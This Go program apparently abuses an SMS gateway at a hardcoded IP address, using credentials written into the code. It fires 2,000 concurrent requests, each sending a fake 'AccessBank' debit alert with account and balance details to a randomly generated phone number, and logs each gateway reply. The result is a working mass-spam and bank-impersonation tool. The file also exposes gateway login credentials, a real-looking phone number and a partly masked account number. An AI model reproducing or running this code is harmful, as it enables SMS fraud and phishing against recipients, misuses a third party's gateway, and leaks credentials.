package main

import (
	"fmt"
	"io"
	"log"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"sync"
	"time"
)

var wg = sync.WaitGroup{}

func main() {
	LOG_FILE := "log"
	// open log file
	logFile, err := os.OpenFile(LOG_FILE, os.O_APPEND|os.O_RDWR|os.O_CREATE, 0644)
	if err != nil {
		log.Panic(err)
	}
	defer logFile.Close()

	// Set log out put and enjoy :)
	log.SetOutput(logFile)

	// optional: log date-time, filename, and line number
	log.SetFlags(log.Lshortfile | log.LstdFlags)

	start := time.Now()
	wg.Add(2000)
	for i := 1; i <= 2000; i++ {

		go sendSMS()
	}
	wg.Wait()
	elapsed := time.Since(start)
	log.Printf("Processes took %s", elapsed)
}
func sendSMS() {

	client := &http.Client{}
	urlA, err := url.Parse("http://41.76.195.35:8080/fcgi-bin/jar_http_sai.fcgi?username=accesstrans&password=accesstr&to=2348160584802&text=Debit%250aAmt%253aNGN10.75%250aAcc%253a008******703%250aDesc%253a099MJKL21305Mjpn%252fAmt+includes+COMM+%2526+VAT%252fAccount+Balance%250aTime%253a01%252f11%252f2021%250aAvail+Bal%253aNGN15%252c939.28%250aTotal%253aNGN15%252c989.28&dlr-mask=1&from=AccessBank&smsc=7334725312&dlr-url=http://thevartech.com/newdlr.php%253FsmsID%253D19%2526dlr%253D%2525d")
	if err != nil {
		log.Fatal(err)
	}

	// Use the Query() method to get the query string params as a url.Values map.
	values := urlA.Query()
	phoneNumber := rand.Intn(100000000000)
	str := strconv.Itoa(phoneNumber)

	values.Set("to", str)
	urlA.RawQuery = values.Encode()
	request, err := http.NewRequest("GET", urlA.String(), nil)
	log.Println(request)

	if err != nil {
		log.Print(err.Error())
	}

	//request.Header.Add("Accept", "application/json")
	//request.Header.Add("Content-Type", "application/json")

	response, err := client.Do(request)

	if err != nil {
		fmt.Print(err.Error())
	}
	defer func(Body io.ReadCloser) {
		err := Body.Close()
		if err != nil {
			return
		}
	}(response.Body)

	bodyBytes, err := io.ReadAll(response.Body)

	if err != nil {
		fmt.Print(err.Error())
	}

	log.Printf("%d : %s", phoneNumber, string(bodyBytes))
	// log.Println(string(bodyBytes))
	// fmt.Println(string(bodyBytes))

	//var responseObject Response
	//err = json.Unmarshal(bodyBytes, &responseObject)
	//if err != nil {
	//	return
	//}
	//fmt.Println("\nresponse", response)
	//fmt.Println("\nresponse.Body", response.Body)
	//fmt.Println("\nbodyBytes", bodyBytes)
	//fmt.Println("\nresponseObject", responseObject)

	//fmt.Println("\n", responseObject.Joke)
	wg.Done()
}
